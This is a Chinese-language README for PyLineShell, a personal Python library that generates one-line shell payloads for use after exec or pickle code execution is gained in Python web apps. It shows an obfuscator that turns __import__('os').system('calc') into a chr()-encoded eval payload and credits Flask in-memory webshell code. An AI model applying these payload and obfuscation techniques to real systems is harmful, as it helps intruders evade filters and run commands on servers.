### [繁体中文](README_ch.md)

<div align="center"> <img src="bugctf.png" width = 135 height = 99 /></div>
<p align="center">PyLineShell: 一个基于Python3的个人Shell Payload库</p>


PyLineShell是一个基于Python3的个人Shell Payload库，适用于在Python项目拿到exec、pickle命令执行点后的渗透阶段. 用户可以调用Python文件来生成需要的Payload.

🔍生成的Payload基本上为简单的一行长代码，主要针对于无法赋值、无法多行输入的命令执行点. 

💡对于绝大部分应用(Web应用、框架)，都可以一键命令执行和一键写入代码

这是我自己的一个练手项目，希望大佬多多包涵. 可以提issue反馈问题

# 快速开始

使用Python生成一个普通版执行命令的Payload

<iframe width="100%" height="400" src="https://github.com/Leeyangee/PyLineShell/raw/main/%E6%BC%94%E7%A4%BA%E8%A7%86%E9%A2%91.mp4" frameborder="0" allowfullscreen></iframe>

使用Python ASCII码代码混淆器

```cmd
PS C:\PyLineShell\工具> python .\ASCII码代码混淆器.py
请输入要混淆的代码: __import__('os').system('calc')
请输入混淆次数(默认为1): 1
eval(eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(108)+chr(99)+chr(39)+chr(41)))
```

# 鸣谢

在开发的过程中，少不了以下开源/开放代码的支持

* bfengj的Flask内存马代码: https://blog.csdn.net/rfrder/article/details/121005608

<div align="center"> <img src="bugctf.png" width = 135 height = 99 /></div>